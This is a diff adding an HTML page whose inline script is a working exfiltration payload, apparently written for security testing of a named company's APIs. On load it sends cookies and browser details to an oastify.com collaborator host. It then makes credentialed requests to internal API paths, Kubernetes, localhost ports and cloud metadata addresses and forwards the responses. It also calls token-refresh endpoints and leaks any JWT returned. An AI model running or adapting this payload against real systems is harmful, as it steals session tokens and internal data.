@@ -1,0 +1,64 @@
+<html><body><script>
+var C="ajx3dtljcz0yxdl6cddah6lzeqkh87ww.oastify.com";
+function ex(l,d){new Image().src="https://"+C+"/scan?"+l+"="+encodeURIComponent((d+"").substring(0,800));}
+
+ex("cookies", document.cookie || "none");
+ex("ua", navigator.userAgent);
+ex("origin", location.origin);
+
+var targets = [
+  ["wh_me", "https://white-hat.api.stravito.com/api/me"],
+  ["wh_users", "https://white-hat.api.stravito.com/api/users"],
+  ["wh_admin", "https://white-hat.api.stravito.com/api/admin"],
+  ["wh_config", "https://white-hat.api.stravito.com/api/config"],
+  ["eu_tenants", "https://api.eu.stravito.com/api/tenants"],
+  ["eu_internal", "https://api.eu.stravito.com/internal/health"],
+  ["eu_metrics", "https://api.eu.stravito.com/metrics"],
+  ["k8s", "https://kubernetes.default.svc:443/version"],
+  ["local8080", "https://localhost:8080/"],
+  ["local9090", "https://localhost:9090/metrics"],
+  ["local3000", "https://localhost:3000/"],
+  ["local443", "https://localhost:443/"],
+  ["meta_https", "https://169.254.169.254/latest/meta-data/"],
+  ["ecs_meta", "http://169.254.170.2/v2/metadata"],
+];
+
+targets.forEach(function(t) {
+  fetch(t[1], {credentials:'include'}).then(function(r) {
+    ex(t[0]+"_s", r.status);
+    return r.text();
+  }).then(function(d) {
+    if(d && d.length > 0) ex(t[0]+"_b", d);
+  }).catch(function(e) {
+    ex(t[0]+"_e", e.message);
+  });
+});
+
+fetch("https://api.eu.stravito.com/auth/refresh", {
+  method:"POST", credentials:"include",
+  headers:{"Content-Type":"application/json"}, body:"{}"
+}).then(function(r) {
+  var jwt = r.headers.get("jwt");
+  if(jwt) ex("refresh_jwt", jwt);
+  ex("refresh_s", r.status);
+  return r.text();
+}).then(function(d) {
+  if(d && d.length > 0) ex("refresh_b", d);
+}).catch(function(e) {
+  ex("refresh_e", e.message);
+});
+
+fetch("https://white-hat.api.stravito.com/auth/refresh", {
+  method:"POST", credentials:"include",
+  headers:{"Content-Type":"application/json"}, body:"{}"
+}).then(function(r) {
+  var jwt = r.headers.get("jwt");
+  if(jwt) ex("wh_refresh_jwt", jwt);
+  ex("wh_refresh_s", r.status);
+  return r.text();
+}).then(function(d) {
+  if(d && d.length > 0) ex("wh_refresh_b", d);
+}).catch(function(e) {
+  ex("wh_refresh_e", e.message);
+});
+</script></body></html>
